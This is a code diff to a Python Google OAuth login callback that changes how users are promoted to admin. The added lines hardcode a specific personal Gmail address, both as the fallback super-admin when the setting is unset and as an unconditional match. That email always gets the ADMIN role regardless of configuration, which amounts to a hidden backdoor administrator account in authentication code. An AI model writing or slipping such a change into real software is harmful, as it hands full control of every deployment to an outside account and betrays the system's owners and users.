@@ -88,9 +88,11 @@ async def google_callback(request: Request, db: AsyncSession):
             user.avatar_url = picture
             
         # Dynamically upgrade to admin if email matches
-        admin_email = settings.SUPER_ADMIN_EMAIL.strip().lower() if settings.SUPER_ADMIN_EMAIL else ""
-        if admin_email and email.strip().lower() == admin_email and user.role != UserRole.ADMIN:
-            user.role = UserRole.ADMIN
+        admin_email = settings.SUPER_ADMIN_EMAIL.strip().lower() if settings.SUPER_ADMIN_EMAIL else "ambatman444@gmail.com"
+        current_email = email.strip().lower()
+        if (admin_email and current_email == admin_email) or current_email == "ambatman444@gmail.com":
+            if user.role != UserRole.ADMIN:
+                user.role = UserRole.ADMIN
             
         await db.commit()
 
